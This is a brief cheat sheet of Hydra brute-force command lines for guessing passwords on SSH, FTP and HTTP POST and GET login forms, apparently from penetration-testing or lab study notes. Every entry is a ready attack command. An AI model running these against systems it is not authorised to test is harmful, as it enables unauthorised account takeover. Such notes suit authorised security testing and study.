## Hydra

### SSH
```
hydra -l <username> -P <wordlist> <ip_addr> -t 4 ssh
```

### FTP
```
hydra -L logins.txt -P passwords.txt ftp://192.168.100.1
hydra -l user -P passwords.txt 192.168.100.1 ftp
```

### HTTP POST Form
```
hydra -l <username> -P <wordlist> <ip_addr> http-post-form "<path>:<login_credentials>:<invalid_response>" -v
-v #verbose
```

### HTTP GET Form
```
hydra -l <username> -P <wordlist> <ip_addr> http-get-form "<path>:<login_credentials>:<invalid_response>" -v
```


